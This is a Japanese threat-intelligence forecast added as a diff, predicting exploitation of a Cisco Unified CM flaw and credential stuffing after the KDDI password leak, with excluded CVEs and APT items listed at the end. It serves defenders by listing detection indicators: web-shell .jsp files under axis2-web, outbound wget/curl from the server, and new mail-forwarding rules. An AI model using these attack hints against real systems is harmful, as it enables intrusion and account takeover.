+  Evidence: [SSD Secure Disclosure 2026-06-24] 完全なPoC手順が公開。PoC公開後のCisco製品への即日武器化は過去（CVE-2026-20262 Cisco SD-WAN等）でも観測されている。
+  過去パターン: Cisco製品のPoC公開後は多数の攻撃グループが48〜72時間以内に自動スキャン・大規模展開に移行する事例が複数確認されている（Cisco SD-WAN 2026-06・Cisco ISE 2026-06等）。
+  脅威情報: Cisco Unified CMはインターネット露出しているケースが多く（企業の電話基盤・コールセンター）、Shodanでの索引台数は数万台規模と推定される。
+先回り監視: /platform-services/axis2-web/以下に*.jspファイルが存在するか。UCMサーバからの外部HTTP(S)通信（wget/curl等）がないか。新規サービスアカウントのSSH認証試行。
+的中判定: CERTアドバイザリまたはセキュリティベンダーがCVE-2026-20230を悪用した新規インシデント事例・新規IOC（C2 IP/ドメイン/シェルハッシュ）を48時間以内に公開した場合
+
+------------------------------------------------------------
+
+・予報2: KDDI漏洩クレデンシャルを使ったクレデンシャルスタッフィング攻撃への対応を即時開始すべき
+Tier: T2（確認済みTTPsを新たに露出した攻撃面に適用）
+確度: 高
+根拠:
+  Evidence: [KDDI / Japan Times 2026-06-24] 最大1,422万件のメールアドレス・パスワード（ハッシュ/暗号化済み）の流出が公式確認。影響ISPはSTNet / JCOM / ニフティ / ビッグローブ等6社。
+  Evidence: [SecurityWeek 2026-06-23] 「脆弱性エクスプロイトがクレデンシャル窃取を凌駕して主要侵害ベクターに」（Verizon DBIR 2026）とVerizonが確認。盗まれたクレデンシャルの即時悪用が業界トレンドとして確認されている。
+  過去パターン: 大規模クレデンシャル流出事件（7pay / LINE 等）後、48〜72時間以内にクレデンシャルスタッフィング試行が急増する事例が日本でも繰り返し観測されている。ハッシュパスワードでもMD5・SHA1等の弱いハッシュは数時間でクラックされる。
+  脅威情報: 調査期間内に「24 billion stolen passwords linked to live exploit data」（TechTimes 2026-06-20）という別報告もあり、現在のクレデンシャル悪用環境は非常に活発。
+先回り監視: 影響ISPのメールドメインを持つ自組織アカウントへのVPN・メール・SSO認証の失敗カウント急増。通常と異なる地域・時間帯からのログイン成功。メール転送ルール・受信トレイ削除ルールの新規作成（BEC前兆）。
+的中判定: JPCERT/CCまたはセキュリティベンダーがKDDI漏洩クレデンシャルを使ったスタッフィング攻撃またはBECインシデントを48〜72時間以内に報告した場合
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【除外サマリー】
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[CVE]
+・CVE-2026-45585 YellowKey → ゼロデイ特報に採用（パッチ提供済み2026-06-10、PoC公開・BTiLocker無力化リスク）
+・CVE-2026-9071 / CVE-2026-9006 (IBM WebSphere SSRF) → 採用期間内（6/22公開）だが実悪用・PoC未確認・KEV未登録・製品普及度中程度。24時間窓内の新規変化が境界線上。本日は除外し翌日の新規悪用・PoC確認をもって採用を検討する
+・CVE-2026-8858 (IBM WebSphere Web Server Plug-in RCE) → 同上理由で除外。RCE可能だが実悪用・PoC・KEV登録なし
+・CVE-2026-10845 (IBM WebSphere認証バイパス) → NVD詳細未確認・実悪用未確認・除外
+・CVE-2026-5027 (Langflow) → 既報（2026-06-18掲載済み）かつ本調査期間内に新規変化なし（CVE-2026-20230への継続攻撃と同傾向だが個別の新変化なし）→ 除外
+・CVE-2026-20181 / CVE-2026-20190 (Cisco ISE) → 前回継続監視対象。本調査期間内にPoC公開・新規インシデント・IOC公開確認されず。既報 + 変化なし → 除外（変化確認時に再採用）
+
+[APT]
+・Salt Typhoon（中国系）/ 米国テレコム持続的侵害 → 既報の継続活動であり、本調査期間24時間内に新規キャンペーン初報・合同勧告・新規IOC公開なし → 除外
+
+本日の集計:
+CVE — ゼロデイ特報1件（CVE-2026-45585）/ 本編4件 / 参考A3件（CVE-2026-11374 / NVIDIA NeMo 3件まとめ / KDDI侵害）/ 参考B4件 / 除外7件
+APT — 本編0件 / 注目動向1件（Nightmare Eclipse）/ 除外1件
+
+========================================
